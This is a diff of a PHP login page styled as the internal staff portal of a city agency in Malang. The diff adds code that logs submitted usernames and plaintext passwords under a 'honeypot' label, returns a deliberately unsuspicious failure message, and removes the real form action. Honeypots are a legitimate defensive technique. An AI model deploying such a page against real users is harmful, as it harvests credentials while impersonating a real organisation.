@@ -1,3 +1,22 @@
+<?php
+// Jika form dikirim, log data input
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
+    $username = $_POST['username'] ?? 'N/A';
+    $password = $_POST['password'] ?? 'N/A';
+    $timestamp = date('Y-m-d H:i:s');
+
+    $logData = "[$timestamp] IP: $ip | Agent: $agent | Username: $username | Password: $password\n";
+    file_put_contents('honeypot_login_attempts.log', $logData, FILE_APPEND);
+
+    // Tampilkan respon umum agar tidak mencurigakan
+    $feedback = "Login gagal. Silakan periksa kembali kredensial Anda.";
+} else {
+    $feedback = null;
+}
+?>
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -59,17 +78,26 @@
       font-size: 0.8rem;
       color: #666;
     }
+
+    .feedback {
+      margin-top: 1rem;
+      font-size: 0.9rem;
+      color: red;
+    }
   </style>
 </head>
 <body>
 
   <div class="login-box">
     <h2>Masuk Sistem Internal</h2>
-    <form action="/internal/login" method="POST">
+    <form method="POST">
       <input type="text" name="username" placeholder="NIP / Email Pegawai" required />
       <input type="password" name="password" placeholder="Kata Sandi" required />
       <button type="submit">Masuk</button>
     </form>
+    <?php if ($feedback): ?>
+      <p class="feedback"><?= htmlspecialchars($feedback) ?></p>
+    <?php endif; ?>
     <p class="notice">Hak akses terbatas. Hanya untuk pegawai DLH Kota Malang.</p>
   </div>
 
